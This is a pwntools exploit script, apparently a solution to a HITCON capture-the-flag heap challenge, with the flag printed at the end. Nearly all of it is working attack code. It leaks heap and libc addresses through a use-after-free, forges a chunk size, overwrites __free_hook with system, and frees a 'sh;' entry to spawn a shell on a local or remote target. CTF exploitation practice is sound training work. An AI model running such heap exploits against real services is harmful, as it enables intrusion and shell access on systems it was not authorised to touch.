from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./run_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))



def add_user(username,password):
    sla("> ","2")
    sa("> ",username)
    sa("> ",password)
def free_user(username):
    sla("> ","3")
    sa("> ",username)
def change_pass(username,password):
    sla("> ","4")
    sa("> ",username)
    sa("> ",password)
def show_user():
    sla("> ","5")

sla("> ","1")
sla("> ","1")

free_user("root")
show_user()
ru(": ")
heap = u64(r.recv(6).ljust(8,b"\x00")) - 0x10
leak("heap",hex(heap))
add_user("aaa","bbb")
add_user("ccc","ddd")
free_user("aaa")
free_user("ccc")
sla("> ","1")
free_user("root")
show_user()
new_user = r.recv(6)
change_pass(new_user,"fake2")
free_user(new_user)
ooo = heap + 0x8d0
add_user(p64(ooo),p64(0))
add_user("555","666")
fake_size = 0x441
add_user(p64(0), p64(fake_size))
for _ in range(14):
    add_user("777","888")
pause()
free_user(p64(heap+0x8e0))
sla("> ","1")
add_user("a","b")
show_user()
libc = l64() - 0x1ecb61
leak("libc",hex(libc))
free_hook = libc + 0x1eee48
system = libc + 0x52290
for _ in range(12):
    add_user("a","b")


sla("> ","1")
free_user("root")
add_user("aaa","bbb")
add_user("ccc","ddd")
free_user("aaa")
free_user("ccc")
show_user()
new_user = r.recv(6)
change_pass(new_user,"fake2")
free_user(new_user)
add_user(p64(free_hook-8),p64(0))
add_user("555","666")
add_user("sh;",p64(system))
free_user("sh;")


r.interactive()

'''
Writeup:
hitcon{fr0m-H3ap-jum9-2-system}
'''